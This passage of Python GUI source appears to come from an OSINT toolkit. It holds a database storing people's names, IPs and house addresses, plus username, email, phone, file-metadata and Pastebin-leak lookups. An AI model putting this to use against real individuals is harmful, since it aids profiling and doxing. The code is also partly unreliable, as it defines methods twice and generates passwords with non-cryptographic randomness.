        index = self.db_table.GetFirstSelected()
        if index == -1:
            return

        data_to_show = self.filtered_data if hasattr(self, "filtered_data") else self.db_data
        if index >= len(data_to_show):
            return

        entry = data_to_show[index]
        dlg = InfoEntryDialog(self, entry)
        if dlg.ShowModal() == wx.ID_OK:
            updated = dlg.get_data()
            updated["Date"] = entry["Date"]  # Preserve original date
            original_index = self.find_original_index(entry)
            if original_index == -1:
                wx.MessageBox("Original entry not found.", "Error", wx.ICON_ERROR)
                return
            self.db_data[original_index] = updated
            self.refresh_db_table()
            self.save_db_to_csv()
            self.log_action("Entry Edited", updated)
        dlg.Destroy()

    def load_db_from_csv(self):
        self.db_data = []
        try:
            with open("info_database.csv", newline='', encoding="utf-8") as csvfile:
                reader = csv.DictReader(csvfile)
                for row in reader:
                    # Convert 'Date' string back to datetime object
                    if 'Date' in row and row['Date']:
                        try:
                            row['Date'] = datetime.datetime.strptime(row['Date'], "%Y-%m-%d %H:%M:%S")
                        except Exception:
                            row['Date'] = datetime.datetime.now()
                    else:
                        row['Date'] = datetime.datetime.now()
                    self.db_data.append(row)
        except FileNotFoundError:
            # File doesn't exist yet - start with empty data
            self.db_data = []

    def save_db_to_csv(self):
        with open("info_database.csv", "w", newline='', encoding="utf-8") as csvfile:
            fieldnames = ["Name", "IP", "ISP", "City", "State", "Country", "Status", "House Address", "Date"]
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for entry in self.db_data:
                # Format datetime object to string for CSV
                row = entry.copy()
                if isinstance(row["Date"], datetime.datetime):
                    row["Date"] = row["Date"].strftime("%Y-%m-%d %H:%M:%S")
                writer.writerow(row)

    def find_original_index(self, entry):
        for i, e in enumerate(self.db_data):
            if e["Name"] == entry["Name"] and e["Date"] == entry["Date"]:
                return i
        return -1

    def on_db_filter(self, event):
        choice = self.db_filter.GetStringSelection()
        if choice == "Alphabetical (Name)":
            self.db_data.sort(key=lambda x: x["Name"], reverse=not self.sort_ascending)
        else:
            self.db_data.sort(key=lambda x: x["Date"], reverse=not self.sort_ascending)
        self.refresh_db_table()

    def on_db_column_click(self, event):
        col = event.GetColumn()
        if self.current_sort_col == col:
            self.sort_ascending = not self.sort_ascending
        else:
            self.current_sort_col = col
            self.sort_ascending = True

        col_name_map = {i: key for i, key in enumerate(["Name", "IP", "ISP", "City", "State", "Country", "Status", "House Address", "Date"])}
        key_name = col_name_map.get(col, "Name")

        if key_name == "Date":
            self.db_data.sort(key=lambda x: x[key_name], reverse=not self.sort_ascending)
        else:
            self.db_data.sort(key=lambda x: str(x[key_name]).lower(), reverse=not self.sort_ascending)
        self.refresh_db_table()

    def on_db_delete(self, event):
        index = self.db_table.GetFirstSelected()
        if index == -1:
            return

        data_to_show = self.filtered_data if hasattr(self, "filtered_data") else self.db_data
        if index >= len(data_to_show):
            return

        entry = data_to_show[index]
        name = entry["Name"]
        confirm = wx.MessageBox(f"Are you sure you want to delete '{name}'?",
                                "Confirm Deletion", wx.YES_NO | wx.ICON_WARNING)

        if confirm == wx.YES:
            original_index = self.find_original_index(entry)
            if original_index == -1:
                wx.MessageBox("Original entry not found.", "Error", wx.ICON_ERROR)
                return
            del self.db_data[original_index]
            self.refresh_db_table()
            self.save_db_to_csv()
            self.log_action("Entry Deleted", entry)
            self.db_edit_btn.Disable()
            self.db_delete_btn.Disable()

    def refresh_db_table(self, filtered=False):
        self.db_table.Freeze()
        self.db_table.DeleteAllItems()

        data_to_show = self.filtered_data if filtered and hasattr(self, "filtered_data") else self.db_data

        for entry in data_to_show:
            index = self.db_table.InsertItem(self.db_table.GetItemCount(), entry["Name"])
            self.db_table.SetItem(index, 1, entry["IP"])
            self.db_table.SetItem(index, 2, entry["ISP"])
            self.db_table.SetItem(index, 3, entry["City"])
            self.db_table.SetItem(index, 4, entry["State"])
            self.db_table.SetItem(index, 5, entry["Country"])
            self.db_table.SetItem(index, 6, entry["Status"])
            self.db_table.SetItem(index, 7, entry["House Address"])
            self.db_table.SetItem(index, 8, entry["Date"].strftime("%Y-%m-%d %H:%M:%S"))
        self.db_table.Thaw()

        # Clear preview and buttons if nothing selected
        self.detail_text.SetValue("")
        self.db_edit_btn.Disable()
        self.db_delete_btn.Disable()

    def on_db_item_selected(self, event):
        index = self.db_table.GetFirstSelected()
        if index == -1:
            return
        # Determine current data list (filtered or not)
        data_to_show = self.filtered_data if hasattr(self, "filtered_data") else self.db_data
        if index >= len(data_to_show):
            return

        entry = data_to_show[index]
        # Format entry details nicely for preview
        details = "\n".join(f"{k}: {v if k != 'Date' else v.strftime('%Y-%m-%d %H:%M:%S')}" for k, v in entry.items())
        self.detail_text.SetValue(details)

        self.db_edit_btn.Enable()
        self.db_delete_btn.Enable()

    def log_action(self, action, entry):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry_name = entry.get("Name", "Unknown")
        log_entry = f"{timestamp} - {action}: {entry_name}"
        self.audit_log.append(log_entry)
        self.update_audit_log()

    def update_audit_log(self):
        self.audit_text.SetValue("\n".join(self.audit_log[-100:]))  # keep last 100 entries

    def on_db_new(self, event):
        dlg = InfoEntryDialog(self)
        if dlg.ShowModal() == wx.ID_OK:
            data = dlg.get_data()
            data["Date"] = datetime.datetime.now()
            self.db_data.append(data)
            self.refresh_db_table()
            self.save_db_to_csv()
            self.log_action("New Entry Added", data)
        dlg.Destroy()

    def on_db_edit(self, event):
        index = self.db_table.GetFirstSelected()
        if index == -1:
            return

        data_to_show = self.filtered_data if hasattr(self, "filtered_data") else self.db_data
        if index >= len(data_to_show):
            return

        entry = data_to_show[index]
        dlg = InfoEntryDialog(self, entry)
        if dlg.ShowModal() == wx.ID_OK:
            updated = dlg.get_data()
            updated["Date"] = entry["Date"]  # Preserve original date
            # Find index in original db_data to update
            original_index = self.db_data.index(entry)
            self.db_data[original_index] = updated
            self.refresh_db_table()
            self.save_db_to_csv()
            self.log_action("Entry Edited", updated)
        dlg.Destroy()

    def on_db_delete(self, event):
        index = self.db_table.GetFirstSelected()
        if index == -1:
            return

        data_to_show = self.filtered_data if hasattr(self, "filtered_data") else self.db_data
        if index >= len(data_to_show):
            return

        entry = data_to_show[index]
        name = entry["Name"]
        confirm = wx.MessageBox(f"Are you sure you want to delete '{name}'?",
                                "Confirm Deletion", wx.YES_NO | wx.ICON_WARNING)

        if confirm == wx.YES:
            original_index = self.db_data.index(entry)
            del self.db_data[original_index]
            self.refresh_db_table()
            self.save_db_to_csv()
            self.log_action("Entry Deleted", entry)
            self.db_edit_btn.Disable()
            self.db_delete_btn.Disable()

    def create_hash_generator_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input label and multiline text box
        sizer.Add(wx.StaticText(panel, label="Input text:"), 0, wx.ALL, 5)
        self.hash_input = wx.TextCtrl(panel, style=wx.TE_MULTILINE, size=(-1, 100))
        sizer.Add(self.hash_input, 0, wx.EXPAND | wx.ALL, 5)

        # Algorithm choice dropdown
        alg_label = wx.StaticText(panel, label="Hash Algorithm:")
        sizer_alg = wx.BoxSizer(wx.HORIZONTAL)
        sizer_alg.Add(alg_label, 0, wx.ALL | wx.CENTER, 5)
        self.hash_alg_choice = wx.Choice(panel, choices=["MD5", "SHA1", "SHA256"])
        self.hash_alg_choice.SetSelection(0)
        sizer_alg.Add(self.hash_alg_choice, 0, wx.ALL | wx.CENTER, 5)
        sizer.Add(sizer_alg, 0, wx.LEFT, 5)

        # Generate button
        self.hash_generate_btn = wx.Button(panel, label="Generate Hash")
        self.hash_generate_btn.Bind(wx.EVT_BUTTON, self.on_hash_generate)
        sizer.Add(self.hash_generate_btn, 0, wx.ALL | wx.CENTER, 10)

        # Output label and text box (read-only)
        sizer.Add(wx.StaticText(panel, label="Hash output:"), 0, wx.ALL, 5)
        self.hash_output = wx.TextCtrl(panel, style=wx.TE_READONLY | wx.TE_MULTILINE, size=(-1, 80))
        sizer.Add(self.hash_output, 0, wx.EXPAND | wx.ALL, 5)

        panel.SetSizer(sizer)
        return panel

    def on_hash_generate(self, event):
        text = self.hash_input.GetValue()
        alg = self.hash_alg_choice.GetStringSelection()

        if not text:
            wx.MessageBox("Please enter some text to hash.", "Error", wx.OK | wx.ICON_ERROR)
            return

        # Compute the hash
        text_bytes = text.encode('utf-8')
        if alg == "MD5":
            hash_obj = hashlib.md5(text_bytes)
        elif alg == "SHA1":
            hash_obj = hashlib.sha1(text_bytes)
        elif alg == "SHA256":
            hash_obj = hashlib.sha256(text_bytes)
        else:
            wx.MessageBox("Unsupported hash algorithm selected.", "Error", wx.OK | wx.ICON_ERROR)
            return

        hash_hex = hash_obj.hexdigest()
        self.hash_output.SetValue(hash_hex)

    def create_base64_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input label and multiline text box
        sizer.Add(wx.StaticText(panel, label="Input text:"), 0, wx.ALL, 5)
        self.b64_input = wx.TextCtrl(panel, style=wx.TE_MULTILINE, size=(-1, 100))
        sizer.Add(self.b64_input, 0, wx.EXPAND | wx.ALL, 5)

        # Buttons for Encode and Decode
        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.b64_encode_btn = wx.Button(panel, label="Encode")
        self.b64_decode_btn = wx.Button(panel, label="Decode")
        btn_sizer.Add(self.b64_encode_btn, 0, wx.ALL, 5)
        btn_sizer.Add(self.b64_decode_btn, 0, wx.ALL, 5)
        sizer.Add(btn_sizer, 0, wx.CENTER)

        # Output label and read-only multiline text box
        sizer.Add(wx.StaticText(panel, label="Output:"), 0, wx.ALL, 5)
        self.b64_output = wx.TextCtrl(panel, style=wx.TE_READONLY | wx.TE_MULTILINE, size=(-1, 100))
        sizer.Add(self.b64_output, 0, wx.EXPAND | wx.ALL, 5)

        # Bind events
        self.b64_encode_btn.Bind(wx.EVT_BUTTON, self.on_b64_encode)
        self.b64_decode_btn.Bind(wx.EVT_BUTTON, self.on_b64_decode)

        panel.SetSizer(sizer)
        return panel

    def on_b64_encode(self, event):
        text = self.b64_input.GetValue()
        if not text:
            wx.MessageBox("Please enter text to encode.", "Error", wx.OK | wx.ICON_ERROR)
            return
        try:
            encoded_bytes = base64.b64encode(text.encode('utf-8'))
            encoded_str = encoded_bytes.decode('utf-8')
            self.b64_output.SetValue(encoded_str)
        except Exception as e:
            wx.MessageBox(f"Encoding error: {e}", "Error", wx.OK | wx.ICON_ERROR)

    def on_b64_decode(self, event):
        text = self.b64_input.GetValue()
        if not text:
            wx.MessageBox("Please enter Base64 text to decode.", "Error", wx.OK | wx.ICON_ERROR)
            return
        try:
            decoded_bytes = base64.b64decode(text)
            decoded_str = decoded_bytes.decode('utf-8')
            self.b64_output.SetValue(decoded_str)
        except Exception as e:
            wx.MessageBox(f"Decoding error: {e}", "Error", wx.OK | wx.ICON_ERROR)

    def create_uuid_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Instruction label
        sizer.Add(wx.StaticText(panel, label="Generate UUID (v4):"), 0, wx.ALL, 5)

        # Output text control (read-only)
        self.uuid_output = wx.TextCtrl(panel, style=wx.TE_READONLY)
        sizer.Add(self.uuid_output, 0, wx.EXPAND | wx.ALL, 5)

        # Generate button
        self.uuid_generate_btn = wx.Button(panel, label="Generate UUID")
        sizer.Add(self.uuid_generate_btn, 0, wx.CENTER | wx.ALL, 5)

        # Bind button event
        self.uuid_generate_btn.Bind(wx.EVT_BUTTON, self.on_uuid_generate)

        panel.SetSizer(sizer)
        return panel

    def on_uuid_generate(self, event):
        new_uuid = str(uuid.uuid4())
        self.uuid_output.SetValue(new_uuid)

    def create_password_generator_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Password length label and spin control
        length_sizer = wx.BoxSizer(wx.HORIZONTAL)
        length_sizer.Add(wx.StaticText(panel, label="Length:"), 0, wx.ALL | wx.CENTER, 5)
        self.pw_length_ctrl = wx.SpinCtrl(panel, min=4, max=128, initial=12)
        length_sizer.Add(self.pw_length_ctrl, 0, wx.ALL, 5)
        sizer.Add(length_sizer, 0, wx.LEFT, 10)

        # Checkboxes for character sets
        self.chk_upper = wx.CheckBox(panel, label="Uppercase (A-Z)")
        self.chk_upper.SetValue(True)
        self.chk_lower = wx.CheckBox(panel, label="Lowercase (a-z)")
        self.chk_lower.SetValue(True)
        self.chk_digits = wx.CheckBox(panel, label="Digits (0-9)")
        self.chk_digits.SetValue(True)
        self.chk_symbols = wx.CheckBox(panel, label="Symbols (!@#$...)")
        self.chk_symbols.SetValue(False)

        sizer.Add(self.chk_upper, 0, wx.ALL, 5)
        sizer.Add(self.chk_lower, 0, wx.ALL, 5)
        sizer.Add(self.chk_digits, 0, wx.ALL, 5)
        sizer.Add(self.chk_symbols, 0, wx.ALL, 5)

        # Generate button
        self.pw_generate_btn = wx.Button(panel, label="Generate Password")
        sizer.Add(self.pw_generate_btn, 0, wx.CENTER | wx.ALL, 5)

        # Output text ctrl (read-only)
        self.pw_output = wx.TextCtrl(panel, style=wx.TE_READONLY)
        sizer.Add(self.pw_output, 0, wx.EXPAND | wx.ALL, 10)

        self.pw_generate_btn.Bind(wx.EVT_BUTTON, self.on_pw_generate)

        panel.SetSizer(sizer)
        return panel

    def on_pw_generate(self, event):
        length = self.pw_length_ctrl.GetValue()
        char_pool = ""
        if self.chk_upper.GetValue():
            char_pool += string.ascii_uppercase
        if self.chk_lower.GetValue():
            char_pool += string.ascii_lowercase
        if self.chk_digits.GetValue():
            char_pool += string.digits
        if self.chk_symbols.GetValue():
            char_pool += "!@#$%^&*()-_=+[]{}|;:,.<>?/"

        if not char_pool:
            wx.MessageBox("Please select at least one character set.", "Error", wx.OK | wx.ICON_ERROR)
            return

        password = "".join(random.choice(char_pool) for _ in range(length))
        self.pw_output.SetValue(password)

    def create_text_encoder_decoder_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Input label and multiline text control
        sizer.Add(wx.StaticText(panel, label="Input Text:"), 0, wx.ALL, 5)
        self.text_io = wx.TextCtrl(panel, style=wx.TE_MULTILINE, size=(400, 100))
        sizer.Add(self.text_io, 0, wx.EXPAND | wx.ALL, 5)

        # Encoding type choice
        sizer.Add(wx.StaticText(panel, label="Select Encoding:"), 0, wx.ALL, 5)
        self.encoding_choice = wx.Choice(panel, choices=["Base64", "URL Encoding", "Hex"])
        self.encoding_choice.SetSelection(0)
        sizer.Add(self.encoding_choice, 0, wx.ALL, 5)

        # Buttons: Encode and Decode
        btn_sizer = wx.BoxSizer(wx.HORIZONTAL)
        self.encode_btn = wx.Button(panel, label="Encode")
        self.decode_btn = wx.Button(panel, label="Decode")
        btn_sizer.Add(self.encode_btn, 0, wx.ALL, 5)
        btn_sizer.Add(self.decode_btn, 0, wx.ALL, 5)
        sizer.Add(btn_sizer, 0, wx.CENTER)

        # Output label and multiline text control
        sizer.Add(wx.StaticText(panel, label="Output Text:"), 0, wx.ALL, 5)
        self.text_output = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY, size=(400, 100))
        sizer.Add(self.text_output, 0, wx.EXPAND | wx.ALL, 5)

        # Bind events
        self.encode_btn.Bind(wx.EVT_BUTTON, self.on_encode)
        self.decode_btn.Bind(wx.EVT_BUTTON, self.on_decode)

        panel.SetSizer(sizer)
        return panel


    def on_encode(self, event):
        input_text = self.text_io.GetValue()
        encoding = self.encoding_choice.GetStringSelection()

        try:
            if encoding == "Base64":
                encoded_bytes = base64.b64encode(input_text.encode('utf-8'))
                output = encoded_bytes.decode('utf-8')
            elif encoding == "URL Encoding":
                output = urllib.parse.quote(input_text)
            elif encoding == "Hex":
                output = binascii.hexlify(input_text.encode('utf-8')).decode('utf-8')
            else:
                output = "Unsupported encoding"
        except Exception as e:
            output = f"Error: {str(e)}"

        self.text_output.SetValue(output)


    def on_decode(self, event):
        input_text = self.text_io.GetValue()
        encoding = self.encoding_choice.GetStringSelection()

        try:
            if encoding == "Base64":
                decoded_bytes = base64.b64decode(input_text)
                output = decoded_bytes.decode('utf-8')
            elif encoding == "URL Encoding":
                output = urllib.parse.unquote(input_text)
            elif encoding == "Hex":
                output = binascii.unhexlify(input_text).decode('utf-8')
            else:
                output = "Unsupported encoding"
        except Exception as e:
            output = f"Error: {str(e)}"

        self.text_output.SetValue(output)

    def create_regex_tester_panel(self):
        panel = wx.Panel(self.content_panel)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # Regex pattern input
        pattern_label = wx.StaticText(panel, label="Regex Pattern:")
        self.regex_pattern_ctrl = wx.TextCtrl(panel, style=wx.TE_PROCESS_ENTER)
        self.regex_pattern_ctrl.SetToolTip("Enter your regular expression here")
        sizer.Add(pattern_label, 0, wx.ALL, 5)
        sizer.Add(self.regex_pattern_ctrl, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 5)

        # Test text input
        test_label = wx.StaticText(panel, label="Test Text:")
        self.regex_test_text_ctrl = wx.TextCtrl(panel, style=wx.TE_MULTILINE)
        self.regex_test_text_ctrl.SetMinSize((400, 150))
        sizer.Add(test_label, 0, wx.ALL, 5)
        sizer.Add(self.regex_test_text_ctrl, 1, wx.EXPAND | wx.LEFT | wx.RIGHT, 5)

        # Matches output display
        matches_label = wx.StaticText(panel, label="Matches:")
        self.regex_matches_ctrl = wx.TextCtrl(panel, style=wx.TE_MULTILINE | wx.TE_READONLY)
        self.regex_matches_ctrl.SetMinSize((400, 150))
        sizer.Add(matches_label, 0, wx.ALL, 5)
        sizer.Add(self.regex_matches_ctrl, 1, wx.EXPAND | wx.LEFT | wx.RIGHT, 5)

        # Test button
        test_btn = wx.Button(panel, label="Test Regex")
        test_btn.Bind(wx.EVT_BUTTON, self.on_regex_test)
        sizer.Add(test_btn, 0, wx.ALL | wx.CENTER, 10)

        panel.SetSizer(sizer)
        return panel


    def on_regex_test(self, event):
        pattern = self.regex_pattern_ctrl.GetValue()
        test_text = self.regex_test_text_ctrl.GetValue()

        if not pattern:
            wx.MessageBox("Please enter a regex pattern.", "Error", wx.OK | wx.ICON_ERROR)
            return

        try:
            regex = re.compile(pattern)
        except re.error as e:
            wx.MessageBox(f"Invalid regex pattern:\n{e}", "Regex Error", wx.OK | wx.ICON_ERROR)
            return

        matches = regex.findall(test_text)
        if matches:
            # Format matches nicely
            formatted_matches = "\n".join([str(m) for m in matches])
            self.regex_matches_ctrl.SetValue(formatted_matches)
        else:
            self.regex_matches_ctrl.SetValue("No matches found.")

    def create_username_scanner_panel(self):
        panel = wx.Panel(self.content_panel)
        main_sizer = wx.BoxSizer(wx.VERTICAL)

        # Input section
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_sizer.Add(wx.StaticText(panel, label="Enter Username:"), 0, wx.ALL | wx.CENTER, 5)
        self.username_input = wx.TextCtrl(panel)
        input_sizer.Add(self.username_input, 1, wx.ALL | wx.EXPAND, 5)

        self.username_scan_btn = wx.Button(panel, label="Scan")
        self.username_scan_btn.Bind(wx.EVT_BUTTON, self.on_scan_usernames)
        input_sizer.Add(self.username_scan_btn, 0, wx.ALL, 5)

        main_sizer.Add(input_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Results table
        self.username_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.username_table.InsertColumn(0, "Platform", width=150)
        self.username_table.InsertColumn(1, "Status", width=100)
        self.username_table.InsertColumn(2, "URL", width=300)

        main_sizer.Add(self.username_table, 1, wx.EXPAND | wx.ALL, 10)

        panel.SetSizer(main_sizer)
        return panel

    def on_scan_usernames(self, event):
        username = self.username_input.GetValue().strip()
        if not username:
            wx.MessageBox("Please enter a username to scan.", "Input Error", wx.ICON_WARNING)
            return

        self.username_table.DeleteAllItems()
        threading.Thread(target=self.scan_usernames_thread, args=(username,), daemon=True).start()

    def scan_usernames_thread(self, username):
        platforms = {
            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://www.reddit.com/user/{username}",
            "Twitter": f"https://twitter.com/{username}",
            "Instagram": f"https://instagram.com/{username}",
            "TikTok": f"https://www.tiktok.com/@{username}",
        }

        results = []
        for platform, url in platforms.items():
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    results.append((platform, "Found", url))
                else:
                    results.append((platform, "Not Found", ""))
            except requests.RequestException:
                results.append((platform, "Error", ""))

        wx.CallAfter(self.populate_username_table, results)

    def populate_username_table(self, results):
        for platform, status, url in results:
            index = self.username_table.InsertItem(self.username_table.GetItemCount(), platform)
            self.username_table.SetItem(index, 1, status)
            self.username_table.SetItem(index, 2, url)

    def create_email_verifier_panel(self):
        panel = wx.Panel(self.content_panel)
        main_sizer = wx.BoxSizer(wx.VERTICAL)

        # Input section
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_sizer.Add(wx.StaticText(panel, label="Enter Email Address:"), 0, wx.ALL | wx.CENTER, 5)
        self.email_input = wx.TextCtrl(panel)
        input_sizer.Add(self.email_input, 1, wx.ALL | wx.EXPAND, 5)

        self.verify_email_btn = wx.Button(panel, label="Verify")
        self.verify_email_btn.Bind(wx.EVT_BUTTON, self.on_verify_email)
        input_sizer.Add(self.verify_email_btn, 0, wx.ALL, 5)

        main_sizer.Add(input_sizer, 0, wx.EXPAND | wx.ALL, 5)

        # Results table
        self.email_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.email_table.InsertColumn(0, "Check", width=200)
        self.email_table.InsertColumn(1, "Result", width=300)

        main_sizer.Add(self.email_table, 1, wx.EXPAND | wx.ALL, 10)

        panel.SetSizer(main_sizer)
        return panel

    def on_verify_email(self, event):
        email = self.email_input.GetValue().strip()
        if not email or "@" not in email:
            wx.MessageBox("Please enter a valid email address.", "Input Error", wx.ICON_WARNING)
            return

        self.email_table.DeleteAllItems()
        threading.Thread(target=self.verify_email_thread, args=(email,), daemon=True).start()

    def verify_email_thread(self, email):
        domain = email.split('@')[-1]
        results = []

        # 1. MX Record Check
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_hosts = sorted([(r.preference, str(r.exchange)) for r in mx_records])
            results.append(("MX Records", f"{len(mx_hosts)} record(s) found"))
            smtp_host = mx_hosts[0][1]
        except Exception as e:
            results.append(("MX Records", f"Failed - {e}"))
            wx.CallAfter(self.populate_email_table, results)
            return

        # 2. SMTP Email Check (Optional – not guaranteed)
        try:
            server = smtplib.SMTP(timeout=10)
            server.connect(smtp_host)
            server.helo(socket.gethostname())
            server.mail("test@example.com")
            code, message = server.rcpt(email)
            server.quit()

            if code == 250 or code == 251:
                results.append(("SMTP RCPT", "Address Valid"))
            else:
                results.append(("SMTP RCPT", f"Rejected: {code} - {message.decode()}"))
        except Exception as e:
            results.append(("SMTP RCPT", f"Error - {e}"))

        wx.CallAfter(self.populate_email_table, results)

    def populate_email_table(self, results):
        for check, result in results:
            index = self.email_table.InsertItem(self.email_table.GetItemCount(), check)
            self.email_table.SetItem(index, 1, result)

    def create_metadata_extractor_panel(self):
        panel = wx.Panel(self.content_panel)
        main_sizer = wx.BoxSizer(wx.VERTICAL)

        # File picker
        file_sizer = wx.BoxSizer(wx.HORIZONTAL)
        file_sizer.Add(wx.StaticText(panel, label="Select File:"), 0, wx.ALL | wx.CENTER, 5)

        self.meta_file_picker = wx.FilePickerCtrl(panel, message="Choose a file")
        file_sizer.Add(self.meta_file_picker, 1, wx.ALL | wx.EXPAND, 5)

        self.meta_extract_btn = wx.Button(panel, label="Extract Metadata")
        self.meta_extract_btn.Bind(wx.EVT_BUTTON, self.on_extract_metadata)
        file_sizer.Add(self.meta_extract_btn, 0, wx.ALL, 5)

        main_sizer.Add(file_sizer, 0, wx.EXPAND | wx.ALL, 10)

        # Results table
        self.meta_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.meta_table.InsertColumn(0, "Field", width=200)
        self.meta_table.InsertColumn(1, "Value", width=500)

        main_sizer.Add(self.meta_table, 1, wx.EXPAND | wx.ALL, 10)

        panel.SetSizer(main_sizer)
        return panel

    def on_extract_metadata(self, event):
        path = self.meta_file_picker.GetPath()
        self.meta_table.DeleteAllItems()

        if not path or not os.path.exists(path):
            wx.MessageBox("Please select a valid file.", "Error", wx.ICON_ERROR)
            return

        ext = os.path.splitext(path)[1].lower()

        metadata = {}

        try:
            if ext in ['.jpg', '.jpeg', '.png']:
                img = Image.open(path)
                info = img._getexif()
                if info:
                    for tag, value in info.items():
                        metadata[TAGS.get(tag, tag)] = str(value)
            elif ext == '.pdf':
                doc = fitz.open(path)
                metadata = {k: str(v) for k, v in doc.metadata.items()}
            elif ext == '.docx':
                doc = docx.Document(path)
                core = doc.core_properties
                metadata = {
                    "Author": core.author,
                    "Title": core.title,
                    "Subject": core.subject,
                    "Created": str(core.created),
                    "Modified": str(core.modified),
                }
            else:
                metadata["Info"] = "Unsupported file type."
        except Exception as e:
            metadata["Error"] = str(e)

        for field, value in metadata.items():
            index = self.meta_table.InsertItem(self.meta_table.GetItemCount(), str(field))
            self.meta_table.SetItem(index, 1, str(value))

    def create_phone_lookup_panel(self):
        panel = wx.Panel(self.content_panel)
        main_sizer = wx.BoxSizer(wx.VERTICAL)

        # Input field
        input_sizer = wx.BoxSizer(wx.HORIZONTAL)
        input_sizer.Add(wx.StaticText(panel, label="Phone Number:"), 0, wx.ALL | wx.CENTER, 5)

        self.phone_input = wx.TextCtrl(panel)
        input_sizer.Add(self.phone_input, 1, wx.ALL | wx.EXPAND, 5)

        lookup_btn = wx.Button(panel, label="Lookup")
        lookup_btn.Bind(wx.EVT_BUTTON, self.on_lookup_phone)
        input_sizer.Add(lookup_btn, 0, wx.ALL, 5)

        main_sizer.Add(input_sizer, 0, wx.EXPAND | wx.ALL, 10)

        # Results table
        self.phone_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.phone_table.InsertColumn(0, "Field", width=200)
        self.phone_table.InsertColumn(1, "Value", width=400)

        main_sizer.Add(self.phone_table, 1, wx.EXPAND | wx.ALL, 10)

        panel.SetSizer(main_sizer)
        return panel

    def on_lookup_phone(self, event):
        number = self.phone_input.GetValue().strip()
        self.phone_table.DeleteAllItems()

        if not number:
            wx.MessageBox("Please enter a phone number.", "Error", wx.ICON_ERROR)
            return

        try:
            parsed = phonenumbers.parse(number, "US")  # Default to US region if no +country code

            if not phonenumbers.is_valid_number(parsed):
                wx.MessageBox("Invalid phone number.", "Error", wx.ICON_ERROR)
                return

            data = {
                "E.164 Format": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.E164),
                "International": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL),
                "National": phonenumbers.format_number(parsed, phonenumbers.PhoneNumberFormat.NATIONAL),
                "Country": geocoder.description_for_number(parsed, "en"),
                "Carrier": carrier.name_for_number(parsed, "en"),
                "Timezone": ", ".join(timezone.time_zones_for_number(parsed)),
                "Valid": str(phonenumbers.is_valid_number(parsed)),
                "Possible": str(phonenumbers.is_possible_number(parsed)),
            }

            for field, value in data.items():
                index = self.phone_table.InsertItem(self.phone_table.GetItemCount(), field)
                self.phone_table.SetItem(index, 1, value)

        except Exception as e:
            wx.MessageBox(f"Error: {e}", "Error", wx.ICON_ERROR)

    def create_pastebin_leak_tool(self):
        panel = wx.Panel(self.content_panel)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # Input
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        hbox.Add(wx.StaticText(panel, label="Search Keyword:"), 0, wx.ALL | wx.CENTER, 5)
        self.pastebin_input = wx.TextCtrl(panel)
        hbox.Add(self.pastebin_input, 1, wx.ALL | wx.EXPAND, 5)
        search_btn = wx.Button(panel, label="Search")
        search_btn.Bind(wx.EVT_BUTTON, self.on_pastebin_search)
        hbox.Add(search_btn, 0, wx.ALL, 5)
        vbox.Add(hbox, 0, wx.EXPAND)

        # Results table
        self.pastebin_table = wx.ListCtrl(panel, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.pastebin_table.InsertColumn(0, "Title", width=300)
        self.pastebin_table.InsertColumn(1, "Date", width=120)
        self.pastebin_table.InsertColumn(2, "URL", width=250)
        vbox.Add(self.pastebin_table, 1, wx.ALL | wx.EXPAND, 10)

        panel.SetSizer(vbox)
        return panel

    def on_pastebin_search(self, event):
        keyword = self.pastebin_input.GetValue().strip()
        if not keyword:
            wx.MessageBox("Please enter a keyword to search.", "Error", wx.ICON_ERROR)
            return

        self.pastebin_table.DeleteAllItems()

        try:
            url = "https://pastebin.com/archive"
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.get(url, headers=headers)
            soup = BeautifulSoup(response.text, "html.parser")

            rows = soup.select("table.maintable tr")[1:]  # skip header
            found = 0

            for row in rows:
                cells = row.find_all("td")
                if len(cells) >= 2:
                    title = cells[0].get_text(strip=True)
                    date = cells[1].get_text(strip=True)
                    link = "https://pastebin.com" + cells[0].a['href']

                    # Check for keyword inside paste content
                    paste_res = requests.get(link, headers=headers)
                    if keyword.lower() in paste_res.text.lower():
                        index = self.pastebin_table.InsertItem(self.pastebin_table.GetItemCount(), title)
                        self.pastebin_table.SetItem(index, 1, date)
                        self.pastebin_table.SetItem(index, 2, link)
                        found += 1

            if found == 0:
                wx.MessageBox("No leaks found with that keyword.", "Info", wx.ICON_INFORMATION)

        except Exception as e:
            wx.MessageBox(f"Error: {e}", "Error", wx.ICON_ERROR)

    def create_dns_enum_panel(self):
        panel = wx.Panel(self.content_panel)
        vbox = wx.BoxSizer(wx.VERTICAL)

        # Input
        hbox = wx.BoxSizer(wx.HORIZONTAL)
